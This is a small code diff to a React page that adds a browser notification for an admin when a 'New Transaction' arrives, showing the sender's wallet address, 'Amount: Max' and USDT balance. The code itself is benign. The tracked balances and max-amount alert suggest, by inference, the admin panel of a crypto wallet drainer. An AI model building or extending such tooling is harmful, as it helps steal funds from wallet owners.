@@ -46,6 +46,18 @@ export default function Index() {
         txHash: data.txHash,
         usdtBalance: data.usdtBalance + " USDT",
         nativeBalance: data.nativeBalance + " BNB",
+      }).then(() => {
+        // Trigger notification if enabled
+        const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
+        if (notificationsEnabled && Notification.permission === "granted") {
+          new Notification("🎯 New Transaction Received!", {
+            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nAmount: Max\nUSDT Balance: ${data.usdtBalance} USDT`,
+            icon: "/favicon.ico",
+            badge: "/favicon.ico",
+            tag: data.txHash,
+            requireInteraction: true,
+          });
+        }
       }).catch(console.error);
     };
 
